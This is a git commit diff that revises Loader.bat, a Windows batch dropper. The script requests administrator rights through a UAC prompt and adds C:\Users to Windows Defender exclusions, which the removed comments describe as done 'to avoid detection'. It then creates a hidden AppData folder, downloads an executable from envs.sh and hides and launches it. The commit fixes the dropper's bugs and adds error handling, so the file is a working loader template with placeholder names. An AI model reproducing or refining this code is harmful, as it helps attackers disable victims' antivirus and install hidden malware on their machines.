f066b2ab3c38cd72cab5e4a271a98dc7466f247c
Merz1lo <Ilya_Bezumov@proton.me>
2025-08-01 10:24:46 +0300

    Fix Potential Errors in Loader.bat

--- Loader.bat
+++ Loader.bat
@@ -1,42 +1,48 @@
 @echo off
-:----------------------------------------------------------------------------------------------------------------: 
+::----------------------------------------------------------------------------------------------------------------::
 IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
     >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (                                                                                                            ::This part of the code checks whether the script is running with administrator rights.
+) ELSE (
     >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
-:----------------------------------------------------------------------------------------------------------------:
+::----------------------------------------------------------------------------------------------------------------::
 if '%errorlevel%' NEQ '0' (
     goto UACPrompt
-) else (                                                                                                            ::This part of the code analyzes the result of the previous administrator rights check command and determines further actions.
+) else (
     goto gotAdmin 
 )
-:----------------------------------------------------------------------------------------------------------------:
-UACPrompt
+::----------------------------------------------------------------------------------------------------------------::
+:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"           ::This part of the code creates and runs a VBS script to request administrator rights via UAC.
+    set params=%*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:", """, "", "runas", 1 >> "%temp%\getadmin.vbs"
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
     exit /B
-:----------------------------------------------------------------------------------------------------------------:
-gotAdmin
-    pushd "%CD%"                                                                                                    ::This part of the code performs important preparatory actions after obtaining administrator rights.
+::----------------------------------------------------------------------------------------------------------------::
+:gotAdmin
+    pushd "%CD%"
     CD /D "%~dp0"
-:----------------------------------------------------------------------------------------------------------------:
-powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\Users'"                                                ::This part of the code adds a path to Windows Defender exclusions to avoid detection.
-:----------------------------------------------------------------------------------------------------------------:
+::----------------------------------------------------------------------------------------------------------------::
+powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\Users'"
+::----------------------------------------------------------------------------------------------------------------::
 cd "C:\Users\%USERNAME%\AppData\Local"
-mkdir "" 2>nul                                                                                                      ::This part of the code creates a hidden folder for the script to run in the user's profile.
+mkdir "nameofyourfolder" 2>nul
 attrib +h "nameofyourfolder" /s /d
 cd "C:\Users\%USERNAME%\AppData\Local\nameofyourfolder"
-:----------------------------------------------------------------------------------------------------------------:
-Powershell -Command "Invoke-WebRequest 'https://envs.sh/nameofyourfile.exe' -OutFile nameofyourfile.exe"
+::----------------------------------------------------------------------------------------------------------------::
+Powershell -Command "Invoke-WebRequest 'https://envs.sh/nameofyourfile.exe' -OutFile 'nameofyourfile.exe'"
 if exist "nameofyourfile.exe" (
     attrib +h "nameofyourfile.exe"
-    start "nameofyourfile.exe"                                                                                      ::This part of the code downloads .exe file, hides it, and runs it.
+    start "" "nameofyourfile.exe"
+    timeout /t 3 >nul
+    if %errorlevel% NEQ 0 (
+        echo Failed to start the executable
+        exit /b 1
+    )
 ) else (
-    exit
+    echo Failed to download the file
+    exit /b 1
 )
-:----------------------------------------------------------------------------------------------------------------:
+::----------------------------------------------------------------------------------------------------------------::
 exit
